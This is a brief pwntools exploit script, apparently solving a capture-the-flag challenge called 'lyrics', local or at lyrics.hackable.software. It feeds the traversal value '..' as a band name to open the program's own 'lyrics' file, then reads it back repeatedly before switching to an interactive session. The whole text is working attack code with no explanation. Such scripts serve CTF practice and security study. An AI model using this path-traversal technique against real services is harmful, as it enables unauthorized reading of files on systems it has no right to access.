from pwn import *

#r = remote('lyrics.hackable.software', 4141)
r = process('./lyrics')

def r_open(band, song):
	r.sendlineafter('Command> ', 'open')
	r.sendlineafter('Band: ', band)
	r.sendlineafter('Song: ', song)
def r_read(idx):
	r.sendlineafter('Command> ', 'read')
	r.sendlineafter('Record ID: ', str(idx))
	print [r.recvline()]

r_open('..', 'lyrics')
for i in range(22):
	print '-'*20
	print i
	r_read(0)
r.interactive()
